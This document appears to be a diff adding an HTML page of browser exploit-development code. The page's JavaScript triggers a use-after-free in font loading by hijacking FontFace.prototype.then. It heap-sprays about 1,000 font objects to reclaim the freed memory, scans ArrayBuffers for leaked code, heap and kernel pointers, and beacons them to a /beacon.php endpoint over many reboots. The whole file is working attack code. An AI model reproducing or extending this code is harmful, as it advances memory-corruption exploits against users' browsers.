@@ -1,0 +1,205 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1124</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){if(typeof v!=='bigint'||v===0n)return'';var h=Number(v>>32n);return h>=0x200&&h<=0x7FFF?'C':h>=0x10&&h<=0xFF?'H':h>=0xFFFF8000?'K':v<0x10000n?'s':'v';}
+function snap(b){var r=[];for(var q=0;q<b.length;q++)if(b[q]!==0n)r.push(q+':'+hex64(b[q])+ptrTag(b[q]));return r.length?r.join(','):'Z';}
+
+var S;try{S=JSON.parse(localStorage.getItem('p1124')||'null');}catch(e){S=null;}
+if(!S)S={b:0,h:0,m:0,R:[],feat:''};S.b++;
+try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+
+B('P1124-BOOT','b='+S.b+'|h='+S.h+'|m='+S.m);
+log('phase','P1124: RECLAIM + FREELIST (boot '+S.b+', '+S.h+' hits)');
+
+// ===== Boot 1: API feature detection =====
+if(S.b===1){
+  var F=[];
+  try{var rab=new ArrayBuffer(8,{maxByteLength:16});F.push('RAB:Y');}catch(e){F.push('RAB:N');}
+  try{F.push('IB:'+(typeof createImageBitmap!=='undefined'?'Y':'N'));}catch(e){F.push('IB:N');}
+  try{F.push('OC:'+(typeof OffscreenCanvas!=='undefined'?'Y':'N'));}catch(e){F.push('OC:N');}
+  try{F.push('WA:'+(typeof AudioContext!=='undefined'||typeof webkitAudioContext!=='undefined'?'Y':'N'));}catch(e){F.push('WA:N');}
+  try{F.push('WR:'+(typeof WeakRef!=='undefined'?'Y':'N'));}catch(e){F.push('WR:N');}
+  try{F.push('FR:'+(typeof FinalizationRegistry!=='undefined'?'Y':'N'));}catch(e){F.push('FR:N');}
+  try{F.push('RO:'+(typeof ResizeObserver!=='undefined'?'Y':'N'));}catch(e){F.push('RO:N');}
+  try{F.push('PO:'+(typeof PerformanceObserver!=='undefined'?'Y':'N'));}catch(e){F.push('PO:N');}
+  try{F.push('TD:'+(typeof TextDecoder!=='undefined'?'Y':'N'));}catch(e){F.push('TD:N');}
+  try{F.push('CS:'+(typeof crypto!=='undefined'&&typeof crypto.subtle!=='undefined'?'Y':'N'));}catch(e){F.push('CS:N');}
+  try{var c=document.createElement('canvas');F.push('GL:'+(c.getContext('webgl')?'Y':'N'));}catch(e){F.push('GL:N');}
+  try{var c2=document.createElement('canvas');F.push('G2:'+(c2.getContext('webgl2')?'Y':'N'));}catch(e){F.push('G2:N');}
+  try{F.push('IDB:'+(typeof indexedDB!=='undefined'?'Y':'N'));}catch(e){F.push('IDB:N');}
+  try{F.push('BrC:'+(typeof BroadcastChannel!=='undefined'?'Y':'N'));}catch(e){F.push('BrC:N');}
+  try{F.push('SWr:'+(typeof navigator.serviceWorker!=='undefined'?'Y':'N'));}catch(e){F.push('SWr:N');}
+  S.feat=F.join('|');
+  B('P1124-FEAT',S.feat);
+  log('info','Features: '+F.join(' '));
+  try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+}
+
+if(S.b>60){
+  log('ok','DONE. '+S.h+' hits, '+S.m+' misses');
+  B('P1124-DONE','h='+S.h+'|m='+S.m+'|feat='+S.feat);
+  for(var i=0;i<S.R.length;i++)B('P1124-R'+i,S.R[i]);
+}else{
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8,r=S.b,fired=false,map=null,found=false;
+
+// WeakRef tracking
+var wr=null,frCalled=false,frTime=0;
+var startTime=Date.now();
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+
+try{if(typeof WeakRef!=='undefined')wr=new WeakRef(ff);}catch(e){}
+try{if(typeof FinalizationRegistry!=='undefined'){
+  var reg=new FinalizationRegistry(function(v){frCalled=true;frTime=Date.now()-startTime;B('P1124-FR','gc_at='+frTime+'ms');});
+  reg.register(ff,'ff');
+}}catch(e){}
+
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+// Detect hit via proven polling pattern
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;S.h++;
+      var hb=b,hbi=bi;
+      var sn=snap(b);
+      var wrAlive=wr?(wr.deref()!==undefined?'Y':'N'):'na';
+      B('P1124-HIT','r'+r+'|bi='+bi+'|ms='+ms+'|wr='+wrAlive+'|'+sn);
+      log('win','HIT at '+ms+'ms! wr='+wrAlive);
+
+      // ===== PHASE A: Extended timeline monitoring =====
+      // Read at many intervals up to 2s to watch for free list pointers
+      var timeline=[30,50,80,120,200,350,500,750,1000,1500,2000];
+      for(var ti=0;ti<timeline.length;ti++){(function(dt){
+        setTimeout(function(){
+          var s=snap(hb);
+          var wa=wr?(wr.deref()!==undefined?'Y':'N'):'na';
+          B('P1124-T'+dt,s+'|wr='+wa+'|fr='+frCalled);
+          if(s!=='Z')log('ptr','T+'+dt+': '+s);
+        },dt);
+      })(timeline[ti]);}
+
+      // ===== PHASE B: Massive same-zone spray at T+150ms =====
+      // Community research says n>=1000 needed for reclaim
+      setTimeout(function(){
+        log('info','Spraying 1000+ CSSFontFace objects...');
+        // Method 1: JS FontFace objects (500)
+        var nf=[],sprOK=0;
+        for(var i=0;i<500;i++){
+          try{
+            var f=new FontFace('rc'+r+'_'+i,'local(Arial)',{unicodeRange:'U+00'+(41+(i%26)).toString(16).toUpperCase()});
+            document.fonts.add(f);
+            nf.push(f);sprOK++;
+          }catch(e){break;}
+        }
+        // Method 2: CSS @font-face rules (500 more)
+        var css='';
+        for(var i=0;i<500;i++){
+          css+="@font-face{font-family:'cs"+r+"_"+i+"';src:local(Arial);unicode-range:U+00"+(41+(i%26)).toString(16).toUpperCase()+";}";
+        }
+        var spSt=document.createElement('style');
+        spSt.textContent=css;
+        document.head.appendChild(spSt);
+        B('P1124-SPRAY','js='+sprOK+'|css=500');
+
+        // Check for reclaim at intervals after spray
+        var rcTimes=[5,15,30,60,120,250,500];
+        for(var ri=0;ri<rcTimes.length;ri++){(function(dt){
+          setTimeout(function(){
+            var s=snap(hb);
+            if(s!=='Z'){
+              var res='RC_'+(150+dt)+'|'+s;
+              S.R.push(res);
+              B('P1124-RC',res);
+              log('win','RECLAIM at T+'+(150+dt)+'! '+s);
+              // Analyze pointer types
+              for(var q=0;q<hb.length;q++){
+                if(hb[q]!==0n){
+                  var tag=ptrTag(hb[q]);
+                  if(tag==='C')B('P1124-CODE','q='+q+'|'+hex64(hb[q]));
+                }
+              }
+            }
+            try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+          },dt);
+        })(rcTimes[ri]);}
+
+        // Cleanup at +1s to reduce memory pressure
+        setTimeout(function(){
+          for(var i=0;i<nf.length;i++){try{document.fonts.delete(nf[i]);}catch(e){}}
+          // After cleanup: check if the freed spray objects reclaim our slot
+          setTimeout(function(){
+            var s=snap(hb);
+            if(s!=='Z'){
+              S.R.push('POST_CLEAN|'+s);
+              B('P1124-PC',s);
+              log('win','POST-CLEANUP reclaim! '+s);
+            }else{
+              B('P1124-PC','Z');
+            }
+            try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+          },100);
+        },1000);
+      },150);
+
+      // ===== PHASE C: Also try document.fonts.add + trigger CSS resolution =====
+      // At T+300ms: force layout that uses fonts
+      setTimeout(function(){
+        var testEl=document.createElement('div');
+        testEl.style.fontFamily='rc'+r+'_0, rc'+r+'_1, Arial';
+        testEl.textContent='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        document.body.appendChild(testEl);
+        document.body.offsetHeight; // force layout
+        var s=snap(hb);
+        if(s!=='Z'){
+          S.R.push('LAYOUT|'+s);
+          B('P1124-LAY',s);
+          log('win','LAYOUT triggered reclaim! '+s);
+        }
+        try{document.body.removeChild(testEl);}catch(e){}
+      },300);
+
+      try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+    }
+  }
+},ms);})(t);}
+
+// Miss timeout
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    S.m++;
+    B('P1124-M','r'+r);
+    try{localStorage.setItem('p1124',JSON.stringify(S));}catch(e){}
+  }
+},350);
+
+}
+</script></body></html>
